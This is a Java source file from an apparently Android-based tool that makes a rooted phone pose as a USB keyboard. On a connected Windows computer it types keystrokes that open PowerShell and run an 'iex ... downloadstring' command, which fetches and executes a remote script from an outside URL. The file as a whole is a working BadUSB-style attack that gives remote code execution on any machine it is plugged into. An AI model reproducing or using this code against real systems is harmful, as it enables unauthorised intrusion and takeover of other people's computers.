package cf.netdex.hidfuzzer.task;

import android.content.Context;

import cf.netdex.hidfuzzer.hid.HIDR;
import cf.netdex.hidfuzzer.hid.Input;
import eu.chainfire.libsuperuser.Shell;

/**
 * Created by netdex on 1/18/2017.
 */

public class LtdPowerShellTask extends HIDTask {
    public LtdPowerShellTask(Context context) {
        super(context, "Runs a PowerShell script in limited privilege environment.");
    }

    @Override
    public void run() {
        Shell.Interactive sh = this.getSU();
        if (sh == null) return;

        final HIDR h = this.getHIDR();

        String file = ask("PowerShell script?", "https://my.mixtape.moe/poecta.txt");

        while (!isCancelled()) {
            publishProgress(HIDTask.RunState.IDLE);
            // poll until /dev/hidg0 is writable
            while (!isCancelled() && h.test() != 0) {
                h.delay(1000);
            }
            if (isCancelled()) break;
            publishProgress(HIDTask.RunState.RUNNING);

            h.delay(1000);
            h.press_keys(Input.KB.M.LSUPER.c, Input.KB.K.E.c);
            h.delay(1000);
            h.press_keys((byte) 0, Input.KB.K.F6.c);
            h.delay(500);
            h.press_keys((byte) 0, Input.KB.K.RIGHT.c);
            h.delay(100);
            h.press_keys((byte) 0, Input.KB.K.UP.c);
            h.delay(100);
            h.press_keys((byte) 0, Input.KB.K.UP.c);
            h.delay(100);
            h.press_keys((byte) 0, Input.KB.K.UP.c);
            h.delay(100);
            h.press_keys((byte) 0, Input.KB.K.ENTER.c);
            h.delay(500);
            h.press_keys(Input.KB.M.LALT.c);
            h.delay(100);
            h.send_string("fws");
            h.delay(1000);
            h.send_string("powershell");
            h.press_keys((byte) 0, Input.KB.K.ENTER.c);
            h.delay(100);
            h.press_keys((byte) 0, Input.KB.K.ENTER.c);
            h.delay(1000);
            h.press_keys((byte) 0, Input.KB.K.ENTER.c);
            h.delay(2000);
            h.send_string("iex ((new-object net.webclient).downloadstring('" + file + "'))\nexit\n");
            publishProgress(HIDTask.RunState.DONE);
            while (!isCancelled() && h.test() == 0) {
                h.delay(1000);
            }
            log("Disconnected");
        }
    }
}
